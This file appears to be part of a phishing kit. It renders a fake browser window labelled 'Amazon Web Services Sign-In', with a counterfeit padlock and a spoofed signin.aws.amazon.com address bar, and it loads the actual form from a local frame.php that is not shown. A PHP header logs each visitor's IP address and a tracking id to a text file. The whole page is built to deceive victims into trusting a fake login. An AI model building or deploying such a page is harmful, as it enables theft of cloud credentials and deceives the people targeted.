<?php 
$file = fopen("log.txt", "a");
$client_ip = $_SERVER['REMOTE_ADDR'];
$client_hash = $_GET["id"];
fwrite($file, $client_ip);
fwrite($file, "\r\n");
fwrite($file, $client_hash);
fwrite($file, "\r\n");
fclose($file);
 ?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<div id="window">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./favicon.ico" width="20px" height="15px" id="logo">
			<span id="logo-description">Amazon Web Services Sign-In</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://signin.aws.amazon.com/</span>
		<span id="domain-path">signin?redirect_uri=https%3A%2F%2Fus-east-1.console.aws.amazon.com%2Fconsole%2Fhome%3FhashArgs%3D%2523%26isauthcode%3Dtrue%26nc2%3Dh_ct%26region%3Dus-east-1%26skipRegion%3Dtrue%26src%3Dheader-signin%26state%3DhashArgsFromTB_us-east-1_1a6fed923a3d3565&client_id=arn%3Aaws%3Asignin%3A%3A%3Aconsole%2Fcanvas&forceMobileApp=0&code_challenge=vQiou6MQSfxbsSax-PmRGN4vWk826XH8B06xhbdTYhs&code_challenge_method=SHA-256</span>
	</div>
</div>
<!-- Content start -->
<iframe id="content" src="./frame.php" frameBorder="0"></iframe>
</div>
</body>
<script src="script.js"></script>
</html>

